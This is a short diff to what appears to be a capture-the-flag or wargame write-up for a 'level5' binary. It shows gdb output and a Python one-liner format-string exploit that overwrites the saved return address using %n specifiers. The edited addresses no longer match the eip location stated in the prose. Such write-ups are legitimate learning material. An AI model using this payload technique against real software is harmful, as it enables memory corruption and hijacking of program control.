@@ -30,7 +30,7 @@ Stack level 0, frame at 0xbffff500:
   eip at 0xbffff4fc
 
 the eip is at 0xbffff4fc, so we have our exploit.
-the address we need to put is 0x080484a4, and we split it in two with the %hn
-modifier:
+the address we need to put is 0x080484a4, and we split it in two with the %hn modifier.
 
-(python -c 'print "\xfc\xf4\xff\xbf\xfe\xf4\xff\xbf%33948x%4$n%33632x%5$n"'; cat) | ./level5
+Exploit:
+(python -c 'print "\x3c\xf4\xff\xbf\x3e\xf4\xff\xbf%33948x%4$n%33632x%5$n"'; cat) | ./level5
